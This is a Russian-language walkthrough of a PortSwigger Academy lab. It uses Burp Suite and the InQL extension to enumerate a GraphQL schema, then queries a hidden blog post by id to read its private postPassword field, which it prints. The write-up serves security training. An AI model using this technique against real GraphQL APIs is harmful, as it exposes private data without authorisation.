Откроем уязвимый ресурс и перейдем по постам, которые там выложены

Далее откроем `Proxy` -> `HTTP history` и найдем `POST` Запрос в GraphQL и отправим его в `Repeater`
```
POST /graphql/v1
```
Для этого зайдем в Extensions и установим расширение GraphQL - InQL
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/1.%20Accessing%20private%20GraphQL%20posts/pics%20for%20walkthrough/1.png)

Откроем запрос через расширение GraphQL и посотрим, что у нас нет элемента с id 3
и даже увидим функцию, по которой мы получаем список полей из запроса

```
query getBlogSummaries {
    getAllBlogPosts {
        image
        title
        summary
        id


    }
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/1.%20Accessing%20private%20GraphQL%20posts/pics%20for%20walkthrough/2.png)
Далее скопируем URL в наше расширение InQL и увидим, что мы можем обратиться к конкретному посту, и по следующим параметрам
```
query {
    getBlogPost(id: Int!) {
        author
        date # Timestamp scalar
        id
        image
        isPrivate
        paragraphs
        postPassword
        summary
        title
    }
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/1.%20Accessing%20private%20GraphQL%20posts/pics%20for%20walkthrough/3.png)

Вернемся в `Repeater` и изменим запрос в квери согласно найденному шаблону, достав все поля 
```
query {
    getBlogPost(id: 3) {
        author
        date # Timestamp scalar
        id
        image
        isPrivate
        paragraphs
        postPassword
        summary
        title
    }
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/1.%20Accessing%20private%20GraphQL%20posts/pics%20for%20walkthrough/4.png)


И заметим поле      `"postPassword": "gepnpk9g372hp8ryzy245o4nw22nsu2w"`,
которое мы и сдадим в качестве ответа

после чего и получим сообщение об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/1.%20Accessing%20private%20GraphQL%20posts/pics%20for%20walkthrough/5.png)
